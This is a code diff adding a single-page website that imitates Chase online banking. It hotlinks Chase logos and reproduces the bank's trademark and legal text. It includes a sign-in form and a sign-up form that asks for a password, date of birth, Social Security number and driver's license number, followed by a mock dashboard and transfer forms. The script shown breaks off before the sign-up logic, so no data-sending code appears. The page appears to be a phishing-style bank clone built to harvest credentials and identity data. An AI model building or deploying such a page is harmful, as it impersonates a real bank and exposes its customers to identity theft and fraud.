+        <img src="https://sites.chase.com/content/mktservices/digital-assets/image.original.jpg/image/creatives/icon/ill-car-linear-blue-restile.jpg" alt="Chase Auto" class="car-image">
+        <h2>Get prequalified in seconds with Chase Auto</h2>
+        <p>Learn how much you can borrow with no impact on your credit score.</p>
+        <a href="#" class="btn-green" style="align-self: flex-start;">Get prequalified</a>
+      </div>
+    </div>
+
+    <footer class="footer">
+      <div class="container">
+        <div class="footer-logo">
+          <img src="https://www.chase.com/content/dam/unified-assets/logo/chase/chase-logo/additional-file-formats/logo_chase_headerfooter.svg" alt="Chase Logo">
+        </div>
+        <div class="footer-grid">
+          <div class="footer-col"><h4>Checking Accounts</h4><ul><li><a href="#">Choose the checking account that works best for you.</a></li></ul></div>
+          <div class="footer-col"><h4>Savings Accounts & CDs</h4><ul><li><a href="#">It's never too early to begin saving.</a></li></ul></div>
+          <div class="footer-col"><h4>Credit Cards</h4><ul><li><a href="#">Chase credit cards can help you buy the things you need.</a></li></ul></div>
+          <div class="footer-col"><h4>Mortgages & Home Equity</h4><ul><li><a href="#">Buy a home, refinance or put your home's equity to work.</a></li></ul></div>
+          <div class="footer-col"><h4>Auto</h4><ul><li><a href="#">Chase Auto is here to help you get the right car.</a></li></ul></div>
+          <div class="footer-col"><h4>Chase for Business</h4><ul><li><a href="#">With Chase for Business you'll receive all-in-one services.</a></li></ul></div>
+          <div class="footer-col"><h4>Sports & Entertainment</h4><ul><li><a href="#">Chase gives you access to unique sports, entertainment and culinary events.</a></li></ul></div>
+          <div class="footer-col"><h4>Chase Security Center</h4><ul><li><a href="#">Our suite of security features can help you protect your info.</a></li></ul></div>
+        </div>
+        <div class="footer-bottom">
+          <div class="legal">
+            <p>"Chase", "JPMorgan", "JPMorganChase", "Chase Bank", "Chase Mobile" and the JPMorgan Chase & Co. logo are trademarks of JPMorgan Chase & Co. Bank deposit accounts, such as checking and savings, may be subject to approval. Deposit products and related services are offered by JPMorgan Chase Bank, N.A. Member FDIC. JPMorgan Chase & Co. is a proud member of the FDIC.</p>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <!-- =========================================================
+       SIGN-IN PAGE
+       ========================================================= -->
+  <div id="signin-page">
+    <header class="auth-header">
+      <img src="https://static.chasecdn.com/content/dam/unified-assets/logo/chase/chase-logo/logo_chase_wht.png" alt="Chase Logo">
+    </header>
+
+    <main class="auth-main">
+      <div class="auth-card">
+        <form id="login-form">
+          <div class="input-group">
+            <input type="text" id="login-username" placeholder=" " required>
+            <label for="login-username">Username</label>
+          </div>
+
+          <div class="input-group password-group">
+            <input type="password" id="login-password" placeholder=" " required>
+            <label for="login-password">Password</label>
+            <span class="toggle-password">Show</span>
+          </div>
+
+          <div class="error-msg" id="login-error">Invalid username or password.</div>
+
+          <div style="display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 24px;">
+            <label style="display: flex; align-items:center; gap:8px;"><input type="checkbox"> Remember username</label>
+            <label style="display: flex; align-items:center; gap:8px;"><input type="checkbox"> Use token</label>
+          </div>
+
+          <button type="submit" class="btn-auth">Sign in</button>
+
+          <div class="divider">Or</div>
+
+          <button type="button" class="btn-passwordless">Passwordless sign in</button>
+
+          <div class="auth-links">
+            <a href="#" class="auth-link">
+              Forgot username/password? 
+              <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+            </a>
+            <a href="#signup" class="auth-link">
+              Not enrolled? Sign up now. 
+              <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+            </a>
+          </div>
+        </form>
+      </div>
+    </main>
+  </div>
+
+  <!-- =========================================================
+       SIGN-UP PAGE
+       ========================================================= -->
+  <div id="signup-page">
+    <header class="auth-header">
+      <div class="logo-box">
+        <img src="https://static.chasecdn.com/content/dam/unified-assets/logo/chase/chase-logo/logo_chase_wht.png" alt="Chase Logo">
+      </div>
+    </header>
+
+    <main class="auth-main">
+      <div class="auth-card">
+        <form id="signup-form">
+          <div class="input-group">
+            <input type="text" id="signup-username" placeholder=" " required>
+            <label for="signup-username">Username</label>
+          </div>
+
+          <div class="input-group password-group">
+            <input type="password" id="signup-password" placeholder=" " required>
+            <label for="signup-password">Password</label>
+            <span class="toggle-password">Show</span>
+          </div>
+
+          <div class="input-group">
+            <input type="text" id="signup-fullname" placeholder=" " required>
+            <label for="signup-fullname">Full Name</label>
+          </div>
+
+          <div class="input-group">
+            <input type="text" id="signup-dob" placeholder=" " required>
+            <label for="signup-dob">Date of Birth (MM/DD/YYYY)</label>
+          </div>
+
+          <div class="input-group">
+            <input type="text" id="signup-ssn" placeholder=" " required>
+            <label for="signup-ssn">Social Security Number</label>
+          </div>
+
+          <div class="input-group">
+            <input type="text" id="signup-dl" placeholder=" " required>
+            <label for="signup-dl">Driver's License Number</label>
+          </div>
+
+          <div class="input-group">
+            <input type="email" id="signup-email" placeholder=" " required>
+            <label for="signup-email">Email Address</label>
+          </div>
+
+          <div class="error-msg" id="signup-error">Username already exists or is invalid.</div>
+
+          <button type="submit" class="btn-auth" id="signup-btn">Sign up</button>
+
+          <div class="auth-links" style="margin-top: 16px;">
+            <a href="#signin" class="auth-link">
+              Already have an account? Sign in
+              <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+            </a>
+          </div>
+        </form>
+      </div>
+    </main>
+  </div>
+
+  <!-- =========================================================
+       DASHBOARD PAGE
+       ========================================================= -->
+  <div id="dashboard-page">
+    
+    <div id="dashboard-main-view" style="flex: 1; display: flex; flex-direction: column;">
+      <header class="dash-header">
+        <div class="dash-top-bar">
+          <button class="menu-btn">
+            <svg viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+          </button>
+          <div class="dash-top-icons">
+            <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+            <svg viewBox="0 0 24 24" id="btn-open-profile" style="cursor: pointer;"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="10" r="3"/><path d="M7 20.662V19a5 5 0 0 1 10 0v1.662"/></svg>
+          </div>
+        </div>
+
+        <div class="dash-greeting">
+          <span id="greeting-text">Good evening, User</span>
+          <span class="divider-bar">|</span>
+          <span class="date-text" id="date-text">Date</span>
+        </div>
+
+        <div class="action-pills">
+          <button class="pill-btn">Deposit checks</button>
+          <button class="pill-btn">Find ATM & branch</button>
+          <button class="pill-btn" id="btn-see-bills">See bill activities</button>
+        </div>
+      </header>
+
+      <main class="dash-main">
+        <div class="snapshot-card">
+          <div class="snapshot-icon">
+            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+          </div>
+          <div class="snapshot-content">
+            <h4>Today's Snapshot <span class="tag">30 sec read</span></h4>
+            <p>Card usage this week: <strong>$0</strong></p>
+          </div>
+          <div class="chevron"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+        </div>
+
+        <div class="accounts-header">
+          <h3>Accounts</h3>
+          <button class="options-btn">...</button>
+        </div>
+
+        <!-- BANK ACCOUNTS -->
+        <div class="account-card">
+          <div class="account-card-header">Bank accounts (1)</div>
+          <div class="account-card-body">
+            <div class="account-name-row">
+              TOTAL CHECKING
+            </div>
+            <div class="account-balance" style="display: flex; justify-content: space-between; align-items: flex-end;">
+              <div style="text-align: left; font-size: 14px; color: #333;" id="account-number-display">...----</div>
+              <div>
+                <div class="amount">
+                  $0.00
+                  <svg style="width: 14px; height: 24px; fill: #999;" viewBox="0 0 24 24"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>
+                </div>
+                <div class="label">Available balance</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- CREDIT CARDS -->
+        <div class="account-card">
+          <div class="account-card-header">
+            <svg style="width: 20px; height: 20px; fill: #fff;" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            Credit cards (1)
+          </div>
+          <div class="account-card-body">
+            <div class="account-name-row" style="font-size: 18px; margin-bottom: 24px;">
+              Sapphire Preferred <span id="cc-number-display" style="font-size: 14px; color: #666; margin-left: 8px;">...----</span>
+            </div>
+            
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+              <!-- Sapphire Preferred Card Image -->
+              <div class="cc-image-container">
+                <img src="https://creditcards.chase.com/content/dam/jpmc-marketplace/card-art/sapphire-preferredcard2026.png" alt="Sapphire Preferred">
+              </div>
+              
+              <!-- Current Balance -->
+              <div class="account-balance">
+                <div class="amount">
+                  $0.00
+                  <svg style="width: 14px; height: 24px; fill: #999;" viewBox="0 0 24 24"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>
+                </div>
+                <div class="label">Current balance</div>
+              </div>
+            </div>
+
+            <!-- Auto Pay Message with dynamic date -->
+            <div class="cc-autopay-msg">
+              <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+              You've scheduled your automatic payment for <span id="autopay-date" style="margin-left: 4px;">...</span>
+            </div>
+          </div>
+        </div>
+
+        <button class="open-account-btn">
+          <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+          Open an account
+        </button>
+
+        <div class="list-container">
+          <div class="list-item">
+            <div class="list-item-icon"><svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .89-2 2v8c0 1.11.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg></div>
+            <div class="list-item-content">
+              <h4>Spending & budgeting</h4>
+              <p>Set a budget and track your spending</p>
+            </div>
+            <div class="chevron"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+          </div>
+          
+          <div class="list-item">
+            <div class="list-item-icon">
+              <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm2.1-14.5l-4.4 7.6c-.3.5-.1 1.1.4 1.4.5.3 1.1.1 1.4-.4l4.4-7.6c.3-.5.1-1.1-.4-1.4-.5-.3-1.1-.1-1.4.4z"/></svg>
+            </div>
+            <div class="list-item-content">
+              <h4>Credit Journey</h4>
+              <p>Check your free credit score</p>
+            </div>
+            <div class="chevron"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+          </div>
+
+          <div class="list-item">
+            <div class="list-item-icon"><svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg></div>
+            <div class="list-item-content">
+              <h4>Home options</h4>
+              <p>Your home purchase, refinance and insights - all in one place</p>
+            </div>
+            <div class="chevron"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+          </div>
+
+          <div class="list-item">
+            <div class="list-item-icon"><svg viewBox="0 0 24 24"><path d="M18.92 6.01C18.72 5.42 18.16 5 17.5 5h-11c-.66 0-1.21.42-1.42 1.01L3 12v8c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-1h12v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-8l-2.08-5.99zM6.5 16c-.83 0-1.5-.67-1.5-1.5S5.67 13 6.5 13s1.5.67 1.5 1.5S7.33 16 6.5 16zm11 0c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zM5 11l1.5-4.5h11L19 11H5z"/></svg></div>
+            <div class="list-item-content">
+              <h4>Car insights</h4>
+              <p>Get a trade-in estimate, maintenance & recall info and more</p>
+            </div>
+            <div class="chevron"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+          </div>
+        </div>
+      </main>
+    </div>
+
+    <!-- Bill Activities Sub-View -->
+    <div id="bill-activities-view" class="sub-view">
+      <header class="sub-header">
+        <div class="sub-top-bar">
+          <button class="back-btn" id="btn-bills-back">
+            <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+          </button>
+          <div class="chat-icon">
+            <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+          </div>
+        </div>
+        <h1>Bill Activities</h1>
+        <div class="account-label" id="bill-account-label">TOTAL CHECKING (...----)</div>
+      </header>
+
+      <main class="bills-content">
+        <div class="search-bar">
+          <input type="text" placeholder="Search transactions">
+        </div>
+        <div class="empty-state">
+          No transactions found.
+        </div>
+      </main>
+    </div>
+
+    <!-- Pay & Transfer List Sub-View -->
+    <div id="pay-transfer-view" class="sub-view">
+      <header class="sub-header">
+        <div class="sub-top-bar">
+          <button class="back-btn" id="btn-pay-back">
+            <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+          </button>
+          <div class="chat-icon">
+            <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+          </div>
+        </div>
+        <h1>Pay & Transfer</h1>
+      </header>
+
+      <main class="pay-content">
+        <div class="list-container">
+          <div class="list-item" id="trigger-internal">
+            <div class="list-item-icon">
+              <svg viewBox="0 0 24 24" class="icon-bank"><path d="M2 21h20v-2H2v2zm2-3h2V9H4v9zm4 0h2V9H8v9zm4 0h2V9h-2v9zm4 0h2V9h-2v9zm4 0h2V9h-2v9zM12 2L2 8v3h20V8L12 2z"/></svg>
+            </div>
+            <div class="list-item-content">
+              <h4>Transfer to Chase Bank</h4>
+              <p>Instant internal transfer</p>
+            </div>
+          </div>
+
+          <div class="list-item" id="trigger-external">
+            <div class="list-item-icon">
+              <svg viewBox="0 0 24 24" class="icon-bank"><path d="M2 21h20v-2H2v2zm2-3h2V9H4v9zm4 0h2V9H8v9zm4 0h2V9h-2v9zm4 0h2V9h-2v9zm4 0h2V9h-2v9zM12 2L2 8v3h20V8L12 2z"/></svg>
+            </div>
+            <div class="list-item-content">
+              <h4>Transfer to Other Bank</h4>
+              <p>ACH & External</p>
+            </div>
+          </div>
+
+          <div class="list-item" id="trigger-zelle">
+            <div class="list-item-icon">
+              <svg viewBox="0 0 24 24" class="icon-zelle"><path d="M5 4h14v2L8.5 18H19v2H5v-2l10.5-12H5V4z"/></svg>
+            </div>
+            <div class="list-item-content">
+              <h4>Zelle®</h4>
+              <p>Send money to friends</p>
+            </div>
+          </div>
+
+          <div class="list-item" id="trigger-wire">
+            <div class="list-item-icon">
+              <svg viewBox="0 0 24 24" class="icon-wire"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+            </div>
+            <div class="list-item-content">
+              <h4>Wire Transfer</h4>
+              <p>Domestic & International</p>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+
+    <!-- Internal Transfer Sub-View -->
+    <div id="internal-transfer-view" class="sub-view">
+      <div class="transfer-view-container">
+        <div class="transfer-card">
+          <div class="transfer-header">
+            <h2>Internal Transfer</h2>
+            <button class="cancel-btn" onclick="goBackToPay()">Cancel</button>
+          </div>
+          <form onsubmit="event.preventDefault(); alert('Transfer successful!'); goBackToPay();">
+            <div class="form-group">
+              <label>From Account</label>
+              <select class="form-control from-account-select">
+                <option>EVERYDAY CHECKING ...0000 ($0.00)</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>To Account</label>
+              <select class="form-control">
+                <option>Select internal account...</option>
+                <option>Checking ...9921</option>
+                <option>Savings ...5582</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>Amount</label>
+              <input type="number" class="form-control" placeholder="$0.00" required>
+            </div>
+            <button type="submit" class="send-money-btn">Send Money</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- External Transfer Sub-View -->
+    <div id="external-transfer-view" class="sub-view">
+      <div class="transfer-view-container">
+        <div class="transfer-card">
+          <div class="transfer-header">
+            <h2>Transfer to Other Bank</h2>
+            <button class="cancel-btn" onclick="goBackToPay()">Cancel</button>
+          </div>
+          <form onsubmit="event.preventDefault(); alert('Transfer successful!'); goBackToPay();">
+            <div class="form-group">
+              <label>From Account</label>
+              <select class="form-control from-account-select">
+                <option>EVERYDAY CHECKING ...0000 ($0.00)</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>Bank Name</label>
+              <input type="text" class="form-control" placeholder="e.g. Chase" required>
+            </div>
+            <div class="form-group">
+              <label>Account Name</label>
+              <input type="text" class="form-control" placeholder="Name on account" required>
+            </div>
+            <div class="form-group">
+              <label>Routing Number</label>
+              <input type="text" class="form-control" placeholder="9-digit routing" required>
+            </div>
+            <div class="form-group">
+              <label>Account Number</label>
+              <input type="text" class="form-control" placeholder="Account number" required>
+            </div>
+            <div class="form-group">
+              <label>Amount</label>
+              <input type="number" class="form-control" placeholder="$0.00" required>
+            </div>
+            <button type="submit" class="send-money-btn">Send Money</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- Zelle Sub-View -->
+    <div id="zelle-transfer-view" class="sub-view">
+      <div class="transfer-view-container">
+        <div class="transfer-card">
+          <div class="transfer-header">
+            <h2>Send with Zelle®</h2>
+            <button class="cancel-btn" onclick="goBackToPay()">Cancel</button>
+          </div>
+          <form onsubmit="event.preventDefault(); alert('Zelle payment sent!'); goBackToPay();">
+            <div class="form-group">
+              <label>From Account</label>
+              <select class="form-control from-account-select">
+                <option>EVERYDAY CHECKING ...0000 ($0.00)</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>Recipient Email or Mobile</label>
+              <input type="text" class="form-control" placeholder="email@example.com" required>
+            </div>
+            <div class="form-group">
+              <label>Amount</label>
+              <input type="number" class="form-control" placeholder="$0.00" required>
+            </div>
+            <button type="submit" class="send-money-btn">Send Money</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- Wire Sub-View -->
+    <div id="wire-transfer-view" class="sub-view">
+      <div class="transfer-view-container">
+        <div class="transfer-card">
+          <div class="transfer-header">
+            <h2>Wire Transfer</h2>
+            <button class="cancel-btn" onclick="goBackToPay()">Cancel</button>
+          </div>
+          <form onsubmit="event.preventDefault(); alert('Wire transfer initiated!'); goBackToPay();">
+            <div class="form-group">
+              <label>From Account</label>
+              <select class="form-control from-account-select">
+                <option>EVERYDAY CHECKING ...0000 ($0.00)</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>Recipient Name</label>
+              <input type="text" class="form-control" placeholder="Full legal name" required>
+            </div>
+            <div class="form-group">
+              <label>Bank Name</label>
+              <input type="text" class="form-control" placeholder="Destination Bank" required>
+            </div>
+            <div class="form-group">
+              <label>SWIFT / BIC Code</label>
+              <input type="text" class="form-control" placeholder="SWIFT Code" required>
+            </div>
+            <div class="form-group">
+              <label>IBAN / Account Number</label>
+              <input type="text" class="form-control" placeholder="IBAN or Account #" required>
+            </div>
+            <div class="form-group">
+              <label>Recipient Address</label>
+              <input type="text" class="form-control" placeholder="Street, City, Country" required>
+            </div>
+            <div class="form-group">
+              <label>Amount</label>
+              <input type="number" class="form-control" placeholder="$0.00" required>
+            </div>
+            <button type="submit" class="send-money-btn">Send Money</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- Profile & Settings Sub-View -->
+    <div id="profile-view" class="sub-view">
+      <header class="sub-header">
+        <div class="sub-top-bar">
+          <button class="back-btn" id="btn-profile-back">
+            <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+          </button>
+          <div class="chat-icon">
+            <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+          </div>
+        </div>
+        <h1>Profile & Settings</h1>
+      </header>
+
+      <main class="profile-content">
+        <div class="profile-card main-profile-card">
+          <div class="avatar-large">
+            <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+          </div>
+          <h2 id="profile-display-name">User</h2>
+          <p id="profile-display-email">user@example.com</p>
+        </div>
+
+        <div class="profile-card">
+          <div class="detail-row">
+            <svg class="detail-icon" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+            <div class="detail-text">
+              <span class="detail-label">Username</span>
+              <span class="detail-value" id="profile-username">User</span>
+            </div>
+          </div>
+          
+          <div class="detail-row">
+            <svg class="detail-icon" viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+            <div class="detail-text">
+              <span class="detail-label">Phone</span>
+              <div class="edit-container">
+                <span class="detail-value underlined" id="profile-phone-display">(555) 000-0000</span>
+                <svg class="pencil-icon" id="edit-phone-btn" viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
+              </div>
+              <div class="edit-wrapper" id="phone-edit-wrapper" style="display: none;">
+                <input type="text" id="profile-phone-input" class="edit-input" placeholder="Enter phone number">
+                <button id="btn-save-phone" class="btn-save-edit">Save</button>
+              </div>
+            </div>
+          </div>
+
+          <div class="detail-row">
+            <svg class="detail-icon" viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+            <div class="detail-text">
+              <span class="detail-label">Address</span>
+              <div class="edit-container">
+                <span class="detail-value" id="profile-address-display">N/A</span>
+                <svg class="pencil-icon" id="edit-address-btn" viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
+              </div>
+              <div class="edit-wrapper" id="address-edit-wrapper" style="display: none;">
+                <input type="text" id="profile-address-input" class="edit-input" placeholder="Enter address">
+                <button id="btn-save-address" class="btn-save-edit">Save</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="profile-card" style="padding: 0;">
+          <div class="detail-row" style="padding: 20px 24px; border-bottom: none; align-items: center; justify-content: space-between; margin: 0;">
+            <div style="display: flex; align-items: center; gap: 16px;">
+              <svg class="detail-icon" viewBox="0 0 24 24" style="margin-top: 0;"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+              <span class="detail-value" style="font-weight: 500;">Sign-in & Security</span>
+            </div>
+            <svg viewBox="0 0 24 24" style="width: 20px; height: 20px; fill: #ccc;"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+          </div>
+        </div>
+
+        <button class="btn-signout" id="btn-sign-out">Sign Out</button>
+      </main>
+    </div>
+
+    <!-- Redesigned Bottom Nav & FAB -->
+    <div class="bottom-nav">
+      <div class="nav-item active" id="nav-accounts">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .89-2 2v8c0 1.11.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
+        </svg>
+        <span>Accounts</span>
+      </div>
+      
+      <div class="nav-item" id="nav-pay">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M6.99 11L3 15l3.99 4v-3H14v-2H6.99v-3zM21 9l-3.99-4v3H10v2h7.01v3L21 9z"/>
+        </svg>
+        <span>Pay & transfer</span>
+      </div>
+      
+      <div class="nav-item" id="nav-plan">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M19 3h-4.18C14.4 1.84 13.3 1 12 1c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm2 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/>
+        </svg>
+        <span>Plan & track</span>
+      </div>
+      
+      <div class="nav-item" id="nav-investments">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/>
+        </svg>
+        <span>Investments</span>
+      </div>
+    </div>
+
+    <div class="fab">
+      <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/></svg>
+    </div>
+  </div>
+
+  <!-- =========================================================
+       JAVASCRIPT
+       ========================================================= -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      
+      const signInBtnHome = document.getElementById('trigger-signin');
+      const signupForm = document.getElementById('signup-form');
+      const loginForm = document.getElementById('login-form');
+      
+      const loginError = document.getElementById('login-error');
+      const signupError = document.getElementById('signup-error');
+
+      // Clear errors when typing
+      document.getElementById('login-username').addEventListener('input', () => loginError.style.display = 'none');
+      document.getElementById('login-password').addEventListener('input', () => loginError.style.display = 'none');
+      document.getElementById('signup-username').addEventListener('input', () => signupError.style.display = 'none');
+
+      function handleRoute() {
+        document.body.classList.remove('is-signin', 'is-signup', 'is-dashboard');
+        
+        if (window.location.hash === '#signin') {
+          document.body.classList.add('is-signin');
+          window.scrollTo(0, 0); 
+        } else if (window.location.hash === '#signup') {
+          document.body.classList.add('is-signup');
+          window.scrollTo(0, 0); 
+        } else if (window.location.hash === '#dashboard') {
+          document.body.classList.add('is-dashboard');
+          window.scrollTo(0, 0);
+          initDashboard();
+        }
+      }
+
+      window.addEventListener('hashchange', handleRoute);
+      handleRoute();
+
+      if (signInBtnHome) {
+        signInBtnHome.addEventListener('click', (e) => {
+          e.preventDefault(); 
+          window.location.hash = '#signin';
+        });
+      }
+
+      document.querySelectorAll('.toggle-password').forEach(toggle => {
+        toggle.addEventListener('click', function () {
+          const input = this.parentElement.querySelector('input');
+          const type = input.getAttribute('type') === 'password' ? 'text' : 'password';
+          input.setAttribute('type', type);
+          this.textContent = type === 'password' ? 'Show' : 'Hide';
+        });
+      });
+
+      // --- SIGN UP LOGIC ---
